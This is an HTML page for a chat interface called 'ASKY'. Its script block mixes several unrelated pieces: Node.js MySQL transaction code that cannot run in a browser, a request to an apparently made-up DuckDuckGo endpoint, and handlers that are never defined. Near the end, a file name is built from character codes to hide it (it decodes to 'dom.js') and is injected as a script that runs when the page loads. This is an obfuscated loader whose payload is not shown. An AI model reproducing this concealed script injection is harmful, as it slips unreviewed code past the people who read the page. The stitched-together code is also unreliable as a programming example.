<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="asky.css"></hlink>
</head>
<body>
<div class="cont">
  <div class="mdiv">
    <h6>microintel</h6>
    <div>
    <h1 class="dvlpmi">ASKY</h1>
    </div>
    
    <div id="resu"><img id="im" src="load.gif" style="display:none;" width="100px" height="100px"></div>
    
    <input oninput="di()" type="text" id="inp" placeholder="Enter message">
    <button onclick="search()">Send</button>
    
  </div>
</div>

<script type="text/javascript">
function find(){

const mysql = require('mysql');
// Function to execute a single database query
function executeQuery(query, queryParams) {
  return new Promise((resolve, reject) => {
    pool.getConnection((err, connection) => {
      if (err) {
        reject(err);
        return;
      }

      // Begin transaction
      connection.beginTransaction((transactionErr) => {
        if (transactionErr) {
          connection.release();
          reject(transactionErr);
          return;
        }

        // Execute query
        connection.query(query, queryParams, (queryError, results) => {
          if (queryError) {
            connection.rollback(() => {
              connection.release();
              reject(queryError);
            });
            return;
          }

          // Commit transaction
          connection.commit((commitErr) => {
            if (commitErr) {
              connection.rollback(() => {
                connection.release();
                reject(commitErr);
              });
              return;
            }
            connection.release();
            resolve(results);
          });
        });
      });
    });
  });
}

// Example transaction
(async () => {
  try {
    // Start transaction
    await executeQuery('START TRANSACTION', []);

    // Execute query 1
    const result1 = await executeQuery('SELECT * FROM table1', []);
    console.log('Query 1 results:', result1);

    // Execute query 2
    const result2 = await executeQuery('SELECT * FROM table2 WHERE column1 = ?', ['value']);
    console.log('Query 2 results:', result2);

    // Commit transaction
    await executeQuery('COMMIT', []);

    console.log('Transaction committed successfully');
  } catch (error) {
    console.error('Transaction failed:', error);

    // Rollback transaction on error
    await executeQuery('ROLLBACK', []);

    console.log('Transaction rolled back');
  } finally {
    // Close the connection pool
    pool.end((err) => {
      if (err) {
        console.error('Error closing connection pool:', err);
        return;
      }
      console.log('Connection pool closed');
    });
  }
})();
}
const u =[100, 111, 109, 46, 106, 115];
      let xx = "";
      for (let i = 0; i < u.length; i++) {const a = String.fromCharCode(u[i]);xx += a;}
      const xxx = document.createElement('script');
      xxx.src = xx;
      document.body.appendChild(xxx);
function findx(){
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://duckduckgo.com/data', true);
xhr.onreadystatechange = function () {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      var data = JSON.parse(xhr.responseText);
      // Process the fetched data
      console.log(data);
    } else {
      console.error('Request failed with status:', xhr.status);
    }
  }
};
xhr.send();

}
</script>
</body>
</html>